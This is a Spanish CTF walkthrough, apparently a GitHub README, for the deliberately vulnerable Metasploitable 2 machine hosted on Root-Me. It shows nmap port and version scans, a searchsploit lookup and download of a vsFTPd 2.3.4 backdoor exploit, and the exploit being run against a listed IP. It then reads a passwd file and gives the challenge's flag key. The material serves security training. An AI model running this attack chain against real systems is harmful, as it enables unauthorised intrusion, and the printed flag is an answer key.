<p align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?size=50&color=F7F400&width=500&height=70&lines=Metasploitable_2"></a>
</p>

<h1 align="center"></h1>

**[Descargar máquina]:**

Vulnhub: https://www.vulnhub.com/entry/metasploitable-2,29/

Sourceforge: https://sourceforge.net/projects/metasploitable/files/Metasploitable2/

**[Online]:**

Root-Me: https://www.root-me.org/fr/Capture-The-Flag/CTF-all-the-day/Metasploitable-2-13?lang=en

<h1 align="center"></h1>

</br>

- *Paso 1:* Escanear todos los puertos que están abiertos con Nmap. 
```
nmap -p- --open -sC -n -Pn -vvv ctf04.root-me.org
```
![1](https://user-images.githubusercontent.com/75953873/172515652-41a49316-c195-462f-a88b-bfba74051bf2.png)

Puertos abiertos: [21,22,23,25,53,80,110,139,445,3306,5900]

- *Paso 2:* Detección de servicios y su respectiva versión. 
```
nmap -p 21,22,23,25,53,80,110,139,445,3306,5900 -sV ctf04.root-me.org
```
![2](https://user-images.githubusercontent.com/75953873/172518304-45323ab6-0e48-425d-9bf4-5e3689b86200.png)

Objetivo: Puerto 21 -> Servicio FTP -> Versión -> vsFTPd 2.3.4

- *Paso 3:* Identificación de exploit y descarga. 
```
searchsploit vsFTPd 2.3.4
```
![3](https://user-images.githubusercontent.com/75953873/172518879-12b95d54-5dac-4f0d-918e-96860c1c5eed.png)

`Dato:` cada exploit está enumerado y es irrepetible.

Exploit: 49757

Descargar exploit:
```
searchsploit -m 49757
```
![4](https://user-images.githubusercontent.com/75953873/172519207-132d9579-e008-4980-941a-44925d69d383.png)

- *Paso 5:* Obtener acceso. 

Obtener IP de la máquina a través de un ping:
```
ping -c 2 ctf04.root-me.org
```
![5](https://user-images.githubusercontent.com/75953873/172519517-52e00c2d-277e-43d7-838e-796e99e2ed34.png)

**IP:** 212.129.29.186

Ejecución del exploit:
```
python3 49757.py 212.129.29.186
```
![6](https://user-images.githubusercontent.com/75953873/172519805-0a9e2b66-d85c-4b2a-a5d8-8801fea887c1.png)

Localizar fichero `passwd` y validar flag:
```
cat passwd
```
![7](https://user-images.githubusercontent.com/75953873/172520170-d1cc17c5-5124-4c2f-ba76-10835fc58344.png)

**Key:** bb43e7cf2385d2c38fd5a232b435e59d

![8](https://user-images.githubusercontent.com/75953873/172520842-29a1669f-f89d-44b4-a818-297d7b1b472f.png)
